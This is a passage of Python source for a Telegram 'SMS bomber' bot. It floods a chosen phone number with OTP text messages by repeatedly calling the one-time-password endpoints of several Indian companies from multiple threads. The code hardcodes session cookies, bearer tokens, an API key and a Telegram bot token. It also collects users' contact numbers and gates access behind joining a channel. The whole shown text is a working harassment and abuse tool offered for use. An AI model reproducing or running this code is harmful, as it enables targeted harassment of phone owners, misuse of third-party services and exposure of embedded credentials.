                'Authorization': 'Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI4ZGU0N2UwNy1mMDI0LTRlMTUtODMzNC0zOGMwNmFlMzNkNmEiLCJ1bmlxdWVfYXNzaWduZWRfbnVtYmVyIjoiYjViMWVmNGQtZGI0MS00NzExLThjMjAtMGU4NjQyZDBlMDJiIiwiY3JlYXRlZF90aW1lIjoiMDcgT2N0b2JlciwgMjAyNSB8IDA5OjQzOjExIEFNIiwiZXhwaXJlZF90aW1lIjoiMDcgT2N0b2JlciwgMjAyNSB8IDA5OjU4OjExIEFNIiwiaWF0IjoxNzU5ODEwMzkxLCJpc3MiOiI4ZGU0N2UwNy1mMDI0LTRlMTUtODMzNC0zOGMwNmFlMzNkNmEiLCJhdWQiOiJodHRwczovL2hvc3QtdXJsIiwiZXhwIjoxNzU5ODExMjkxfQ.N8a-NMFqmgO0vtY9Bp14EF22Jo3bMEB4n_OlcgwF3RZdIJDg5ZwC_WFc1aI-AU7BdWjpfrEc52ZSsfQ73S8pnY8RePnJrKqmE61vdWRY37VAULvD99eMl2AS7W2lEdE5EZoGGM2WqBuTzW8aO5QIt98deWDSyK9xG0v4tfbYG0469g7mOOpeCAuZC3gTIKZ93k7aHyMcf5FPjSsfIdNxqmdW0IrRx6bOdyr_w3AmYheg4aNNfMi5bc6fu_eKXABuwC9O420CFai9TIkImUEqr8Rxy4Sfe7aFVTN6DB8Fv_J1i7GBgCa3YX0VfZiGpVowXmcTqJQcGSiH4uZVRsmf3g', 
                'Connection': 'keep-alive', 
                'Content-Type': 'application/json', 
                'Origin': 'https://oneservice.adityabirlacapital.com', 
                'Referer': 'https://oneservice.adityabirlacapital.com/login', 
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0', 
                'authToken': 'eyJraWQiOiJLY2NMeklBY3RhY0R5TWxHVmFVTm52XC9xR3FlQjd2cnNwSWF3a0Z0M21ZND0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzcGRsN2xobHI4ZDkxNm1qcDNyaWt1dGNlIiwidG9rZW5fdXNlIjoiYWNjZXNzIiwic2NvcGUiOiJhdXRoXC9zdmNhcHAiLCJhdXRoX3RpbWUiOjE3NTk4MDcyNDEsImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC5hcC1zb3V0aC0xLmFtYXpvbmF3cy5jb21cL2FwLXNvdXRoLTFfd2h3N0dGb0oxIiwiZXhwIjoxNzU5ODE0NDQxLCJpYXQiOjE3NTk4MDcyNDEsInZlcnNpb24iOjIsImp0aSI6IjVjNTM1ODkxLTBiZjItNDk3ZS04ZTZiLWNkZWZiNzA0OGY1YyIsImNsaWVudF9pZCI6InNwZGw3bGhscjhkOTE2bWpwM3Jpa3V0Y2UifQ.noVIL6Tks0NHZwCmokdjx4hpXntkuNQQjPglIwk-4qG6_DzqmJkYxRkH_ekYxbP0kiWpQp4iDLZasiiP5EIlAXgGZHEY5dEf0jAaiIl8EEGtj4VkUV46njil4LOBFCxsdNfJ-i4hO6iCBddwXu_6OMWJArERdPlg6cpej_y91aPe-UjSuaHexSTmtdzoTRGnZw5W57uiVRZwY3iCPjLWEY-8Qj9a0HqSwTg7oNvOOMac5hCif4IoCNCMP8VoR4F-EttDdWpqW3hETGE6VBMU8R3rY2Q-Vm4CB2VdbToSGtjxFwuMq66OMpVM_G7Fq478JgPhmv9sb85bo2jto8gvow', 
                'browser': 'Microsoft Edge', 
                'browserVersion': '141.0', 
                'csUserId': 'CS6GGNB62PFDLHX6', 
                'loginSource': '26', 
                'pageName': '/login', 
                'source': '151', 
                'traceId': 'CSNwb9nPLzWrVfpl'
            }
            
            data = {'request':'CepT08jilRIQiS1EpaNsQVXbRv3PS/eUQ1lAbKfLJuUNvkkemX01P9n5tJiwyfDP3eEXRcol6uGvIAmdehuWBw=='}
            response = session.post('https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp', headers=headers, cookies=cookies, json=data, timeout=5)
            return response.status_code == 200

        # 28: NEW API - Pinknblu
        elif lim == 28:
            cookies = {
                '_ga': 'GA1.1.1922530896.1759808413', 
                '_gcl_au': '1.1.178541594.1759808413', 
                '_fbp': 'fb.1.1759808414134.913709261257829615', 
                'laravel_session': 'eyJpdiI6IllNM0Z5dkxySUswTlBPVjFTN09KMkE9PSIsInZhbHVlIjoiT1pXQWxLUVdYNXJ0REJmU3Q5R0EzNWc5cGJHbzVsaG5oWjRweFRTNG9cL2l4MHdXUVdTWEFtbEsybDdvTjAyazN4dERkdEsrMlBQeTdYUTR4RXNhNWM5WDlrZGtqOEk2eEVcL1BUUEhoN0F4YjJGTWZKd0tcL2JaQitXZmxWWjRcL0hXIiwibWFjIjoiMTNlZDhlNzM2MmIyMzRlODBlNWU0NTJkYjdlOTY5MmJhMzAzM2UyZjEwODAwOTk5Mzk1Yzc3ZTUyZjBhM2I4ZSJ9', 
                '_ga_8B7LH5VE3Z': 'GS2.1.s1759808413$o1$g1$t1759809854$j30$l0$h1570660322', 
                '_ga_S6S2RJNH92': 'GS2.1.s1759808413$o1$g1$t1759809854$j30$l0$h0'
            }
            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01', 
                'Accept-Language': 'en-US,en;q=0.9', 
                'Connection': 'keep-alive', 
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'Origin': 'https://pinknblu.com', 
                'Referer': 'https://pinknblu.com/', 
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0', 
                'X-Requested-With': 'XMLHttpRequest', 
                'sec-ch-ua': '"Microsoft Edge";v="141", "Not?A_Brand";v="8", "Chromium";v="141"', 
                'sec-ch-ua-mobile': '?0', 
                'sec-ch-ua-platform': '"Windows"'
            }
            data = {
                '_token': 'fbhGqnDcF41IumYCLIyASeXCntgFjC9luBVoSAcb', 
                'country_code': f'+{cc}', 
                'phone': pn
            }
            response = session.post('https://pinknblu.com/v1/auth/generate/otp', headers=headers, cookies=cookies, data=data, timeout=5)
     
            return response.status_code == 200 or '"status":"success"' in response.text.lower()

        # 29: NEW API - Udaan
        elif lim == 29:
            cookies = {
                'gid': 'GA1.2.153419917.1759810454', 
                'sid': 'AVr5misBh4gBAIMSGSayAIeIHvwJYsleAXWkgb87eYu92RyIEsDTp7Wan8qrnUN7IeMj5JEr1bpwY95aCuF1rYO/', 
                'WZRK_S_8R9-67W-W75Z': '%7B%22p%22%3A1%7D', 
                'mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel': '%7B%22distinct_id%22%3A%22%24device%3Ac4623ce0-2ae9-45d3-9f83-bf345b88cb99%22%2C%22%24device_id%22%3A%22c4623ce0-2ae9-45d3-9f83-bf345b88cb99%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fudaan.com%2F%22%2C%22%24initial_referring_domain%22%3A%22udaan.com%22%2C%22mps%22%3A%7B%7D%2C%22mpso%22%3A%7B%22%24initial_referrer%22%3A%22https%3A%2F%2Fudaan.com%2F%22%2C%22%24initial_referring_domain%22%3A%22udaan.com%22%7D%2C%22mpus%22%3A%7B%7D%2C%22mpa%22%3A%7B%7D%2C%22mpu%22%3A%7B%7D%2C%22mpr%22%3A%5B%5D%2C%22_mpap%22%3A%5B%5D%7D', 
                '_ga_VDVX6P049R': 'GS2.1.s1759810459$o1$g0$t1759810459$j60$l0$h0', 
                '_ga': 'GA1.1.803417298.1759810454'
            }
            headers = {
                'accept': '/*', 
                'accept-language': 'en-IN', 
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 
                'origin': 'https://auth.udaan.com', 
                'referer': 'https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2', 
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0', 
                'x-app-id': 'udaan-auth'
            }
            data = {'mobile': pn}
            url = 'https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true'
            response = session.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200 or 'success' in response.text.lower()
            
        # 30: NEW API - Nuvama Wealth
        elif lim == 30:
            headers = {
              'api-key': 'c41121ed-b6fb-c9a6-bc9b-574c82929e7e', 
              'Referer': 'https://onboarding.nuvamawealth.com/', 
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0', 
              'Content-Type': 'application/json'
            }
            data = {"contactInfo": pn, "mode": "SMS"}
            response = session.post('https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO', headers=headers, json=data, timeout=5)
            return response.status_code == 200 or 'success' in response.text.lower()

        return False

    except requests.exceptions.RequestException:
        return False
    except Exception:
        return False


def bombing_thread_worker(user_id, phone_number, context):
    global global_request_counter, request_counts
    cc = DEFAULT_COUNTRY_CODE
    chat_id = user_id
    available_apis = API_INDICES[:]
    while bombing_active.get(user_id) and request_counts.get(user_id, 0) < MAX_REQUEST_LIMIT:
        if not available_apis:
            break
        api_index = random.choice(available_apis)
        success = getapi(phone_number, api_index, cc)
        with global_request_counter:
            request_counts[user_id] = request_counts.get(user_id, 0) + 1
        if not success:
            if api_index in available_apis:
                available_apis.remove(api_index)
        time.sleep(BOMBING_DELAY_SECONDS)


async def perform_bombing_task(user_id, phone_number, context):
    global bombing_active, bombing_threads, request_counts
    
    chat_id = user_id
    request_counts[user_id] = 0
    last_message_time = 0 

    await context.bot.send_message(
        chat_id=chat_id, 
        text=esc(f"Bombing Started with {THREAD_COUNT} Threads Target: `{phone_number}` Max: `{MAX_REQUEST_LIMIT}` requests"),
        parse_mode="MarkdownV2"
    )
    last_message_time = time.time()
    
    workers = []
    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=bombing_thread_worker, args=(user_id, phone_number, context))
        thread.daemon = True
        workers.append(thread)
        thread.start()
        
    bombing_threads[str(user_id)] = workers
    
    try:
        last_count = 0
        while bombing_active.get(user_id):
            await asyncio.sleep(1) # Wait 1 second before checking count
            current_count = request_counts.get(user_id, 0)
            current_time = time.time()
            if current_count > last_count and (current_time - last_message_time) >= TELEGRAM_RATE_LIMIT_SECONDS:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=esc(f"Status Update: `{current_count}` requests sent."),
                    parse_mode="MarkdownV2"
                )
                last_count = current_count
                last_message_time = current_time 
            if current_count >= MAX_REQUEST_LIMIT:
                bombing_active[user_id] = False
                await asyncio.sleep(1) 
                break

    except asyncio.CancelledError:
        pass
    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=esc(f"An error occurred in the bombing: {e}"),
            parse_mode="MarkdownV2"
        )
    finally:
        bombing_active[user_id] = False
        
        for thread in workers:
             thread.join(timeout=1) 
        
        if str(user_id) in bombing_threads:
            del bombing_threads[str(user_id)]
        if user_id in request_counts:
            final_count = request_counts[user_id]
            del request_counts[user_id]
        else:
            final_count = 0
        
        await context.bot.send_message(
            chat_id=chat_id,
            text=esc(f"Bombing Finished. Total requests sent: `{final_count}` ."),
            parse_mode="MarkdownV2"
        )


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    # 🔥 FIX: Contact sharing ONLY works in private chat
    if update.message.chat.type != "private":
        await update.message.reply_text(
            "❌ Cannot Start here.\n"
            "👉 Open my DM and send /start again."
        )
        return

    # Your existing code continues here ↓↓↓
    if update.message.from_user.id in bombing_active and bombing_active[update.message.from_user.id]:
        await update.message.reply_text(
            esc("A bombing task is already running."),
            parse_mode="MarkdownV2"
        )
        return

    button = KeyboardButton("📱 Share Contact", request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)

    await update.message.reply_text(
        esc("Authentication Required. Please share your contact to continue."),
        reply_markup=reply_markup,
        parse_mode="MarkdownV2"
    )


# ---- Consolidated contact handler (saves contact and initiates verification) ----
async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat.type != "private":
        return
    if not update.message or not update.message.contact:
        await update.message.reply_text(
            esc("Authentication Failed. Contact is required for protecting your number."),
            parse_mode="MarkdownV2"
        )
        return

    user = update.message.from_user
    user_id = user.id
    contact = update.message.contact
    phone = contact.phone_number

    db = load_db()

    # store using string keys consistently
    db[str(user_id)] = {
        "user_id": user_id,
        "username": user.username or "no_username",
        "first_name": user.first_name or "",
        "last_name": user.last_name or "",
        "full_name": getattr(user, "full_name", user.first_name) or "",
        "phone": phone
    }
    save_db(db)

    # Acknowledge and remove the contact button
    await update.message.reply_text(
        esc("Contact received. To access the next feature, you must first join our channel."),
        reply_markup=ReplyKeyboardRemove(),
        parse_mode="MarkdownV2"
    )

    # Create the Inline Keyboard with Join and Verification Buttons
    keyboard = [
        [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I Have Joined", callback_data=VERIFY_CALLBACK_DATA)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Send the forced subscription message
    await update.message.reply_text(
        esc("Please join the official channel and click the button below to verify your membership:"),
        reply_markup=reply_markup,
        parse_mode="MarkdownV2"
    )


async def start_bombing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat.type != "private":
        return
    
    user_id = update.message.from_user.id

    if str(user_id) not in load_db():
        await update.message.reply_text(
            esc("🔒 You must share your contact first using /start to access this function."),
            parse_mode="MarkdownV2"
        )
        return

    if bombing_active.get(user_id):
        await update.message.reply_text(
            esc("⚠️ A bombing task is already running. Please use '🛑 Stop Bombing' to end it first."),
            parse_mode="MarkdownV2"
        )
        return

    context.user_data["awaiting_number"] = True
    await update.message.reply_text(
        esc("🎯 Enter the 10-digit target phone number to start the bombing."),
        parse_mode="MarkdownV2"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.message is None:
        return   # Ignore updates that don't contain a message
    
    if update.message.chat.type != "private":
        return

    user_id = update.message.from_user.id
    text = update.message.text
    
    if str(user_id) not in load_db():
        await update.message.reply_text(
            esc("❌ Authentication required. Please use /start first."),
            parse_mode="MarkdownV2"
        )
        return

    if context.user_data.get("awaiting_number"):
        # If user pressed a menu button while awaiting number, treat that as leaving number-entry mode
        if text in ["🔥 Start Bombing", "🛑 Stop Bombing", "📘 Protected Number"]:
            context.user_data["awaiting_number"] = False

        elif text.upper() == "CANCEL":
             context.user_data["awaiting_number"] = False
             await update.message.reply_text(esc("Operation cancelled."), parse_mode="MarkdownV2")
             return
            
        elif not text.isdigit() or len(text) != 10:
            await update.message.reply_text(
                esc("❌ Invalid input. Please enter a valid 10-digit number or use a menu button."),
                parse_mode="MarkdownV2"
            )
            return

        elif text.isdigit() and len(text) == 10:
            context.user_data["awaiting_number"] = False 
            target_number = text

            protected_number = load_db().get(str(user_id), {}).get("phone", "")
            protected_number_no_cc = protected_number.lstrip('+').lstrip(DEFAULT_COUNTRY_CODE)
            
            if target_number == protected_number_no_cc:
                await update.message.reply_text(
                    esc("🛑 Self-Bombing is not allowed. The target number matches your protected number."),
                    parse_mode="MarkdownV2"
                )
                return

            bombing_active[user_id] = True 
            asyncio.create_task(perform_bombing_task(user_id, target_number, context))
            return

    # Menu handling
    if text == "🔥 Start Bombing":
        await start_bombing(update, context)

    elif text == "🛑 Stop Bombing":
        await stop_command(update, context)

    elif text == "📘 Protected Number":
        await show_protected(update, context)


async def send_protected_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Accept either a callback update (from verify) or a message update
    if getattr(update, "callback_query", None):
        user_id = update.callback_query.message.chat_id
    else:
        user_id = update.message.from_user.id

    user_id_str = str(user_id)
    db = load_db()

    if user_id_str not in db or "phone" not in db[user_id_str]: 
        await context.bot.send_message(
            user_id,
            esc("Error: Your contact information was not found. Please re-start with /start."),
            parse_mode="MarkdownV2"
        )
        return

    real_phone = db[user_id_str]["phone"] 
    encrypted = encrypt_number(real_phone)
    
    await context.bot.send_message(
        user_id,
        esc(f"📘 Your Protected Number: Original: `{real_phone}`. Encrypted: `{encrypted}`"),
        parse_mode="MarkdownV2"
    )


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat.type != "private":
        return
    
    user_id = update.message.from_user.id
    
    if bombing_active.get(user_id):
        bombing_active[user_id] = False
        await update.message.reply_text(
            esc("🛑 Stop Signal Sent."),
            reply_markup=ReplyKeyboardRemove(),
            parse_mode="MarkdownV2"
        )
    else:
        await update.message.reply_text(
            esc("ℹ️ No active bombing task is running to stop."),
            parse_mode="MarkdownV2"
        )

async def show_protected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat.type != "private":
        return
    
    user_id = update.message.from_user.id
    user_id_str = str(user_id)
    
    db = load_db()

    if user_id_str not in db or "phone" not in db[user_id_str]:
        await update.message.reply_text(
            esc("🔒 Error: Your contact information was not found. Please re-start with /start."),
            parse_mode="MarkdownV2"
        )
        return

    real_phone = db[user_id_str]["phone"]
    encrypted = encrypt_number(real_phone)
    
    await update.message.reply_text(
        esc(f"📘 Your Protected Number: Original: `{real_phone}`. Encrypted: `{encrypted}`"),
        parse_mode="MarkdownV2"
    )

async def verify_channel_membership(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.callback_query.message.chat.type != "private":
        return
    query = update.callback_query
    await query.answer() # Acknowledge the button press

    user_id = query.from_user.id
    
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        status = member.status

        if status in ["member", "administrator", "creator"]:
            await query.edit_message_text(
                esc("🎉 Verification Successful! Proceeding..."),
                parse_mode="MarkdownV2"
            )
            # Send protected number and main menu
            await send_protected_number(update, context)
            markup = ReplyKeyboardMarkup(
                [
                    ["🔥 Start Bombing", "🛑 Stop Bombing"],
                    ["📘 Protected Number"]
                ],
                resize_keyboard=True
            )
            await context.bot.send_message(
                chat_id=user_id,
                text=esc("Main Menu: Select an option below."),
                reply_markup=markup,
                parse_mode="MarkdownV2"
            )
        else:
            keyboard = [
                [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_LINK)],
                [InlineKeyboardButton("🔄 Re-Verify", callback_data=VERIFY_CALLBACK_DATA)]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                esc(f"❌ Verification Failed. Your status is: `{status}`. Please ensure you have joined the channel and click 'Re-Verify'."),
                reply_markup=reply_markup,
                parse_mode="MarkdownV2"
            )

    except Exception as e:
        await query.edit_message_text(
            esc(f"An error occurred during verification. Please contact support. Error: {e}"),
            parse_mode="MarkdownV2"
        )


def main():
    # 🚨 REMINDER: Replace with your actual bot token when running in production.
    BOT_TOKEN = "8022661176:AAFUD-aiXRQ58Tt0WXDbFizEatC_yLA0_44"

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Single contact handler registered (no duplicates)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    app.add_handler(CallbackQueryHandler(verify_channel_membership, pattern=VERIFY_CALLBACK_DATA))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
